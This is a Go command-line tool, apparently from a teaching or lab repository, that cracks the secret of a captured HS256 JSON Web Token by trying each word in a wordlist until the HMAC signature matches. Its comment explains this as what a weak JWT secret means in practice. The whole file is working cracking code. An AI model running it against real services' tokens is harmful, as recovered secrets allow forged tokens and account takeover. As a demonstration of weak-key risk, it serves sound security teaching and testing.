// bruteforce takes a captured HS256 JWT and a wordlist, and tries each
// word as the HMAC secret until one reproduces the token's signature.
// This is what "a weak JWT secret" actually means in practice: it is not
// about reading the key off the wire (it never is), it's about the key
// space being small enough to search.
//
//	go run ./tools/bruteforce -token "$TOKEN" -wordlist tools/bruteforce/wordlist.txt
package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"flag"
	"fmt"
	"os"
	"strings"
)

func main() {
	token := flag.String("token", "", "captured JWT (required)")
	wordlist := flag.String("wordlist", "", "path to a newline-separated candidate secret list (required)")
	flag.Parse()

	if *token == "" || *wordlist == "" {
		fmt.Fprintln(os.Stderr, "error: -token and -wordlist are required")
		os.Exit(1)
	}

	parts := strings.Split(*token, ".")
	if len(parts) != 3 {
		fmt.Fprintln(os.Stderr, "error: not a header.payload.signature token")
		os.Exit(1)
	}
	signingInput := parts[0] + "." + parts[1]
	wantSig := parts[2]

	f, err := os.Open(*wordlist)
	if err != nil {
		fmt.Fprintln(os.Stderr, "error opening wordlist:", err)
		os.Exit(1)
	}
	defer f.Close()

	tried := 0
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		candidate := strings.TrimSpace(scanner.Text())
		if candidate == "" {
			continue
		}
		tried++

		mac := hmac.New(sha256.New, []byte(candidate))
		mac.Write([]byte(signingInput))
		gotSig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

		if hmac.Equal([]byte(gotSig), []byte(wantSig)) {
			fmt.Printf("FOUND secret after %d attempts: %q\n", tried, candidate)
			return
		}
	}
	fmt.Printf("not found in %d candidates\n", tried)
}
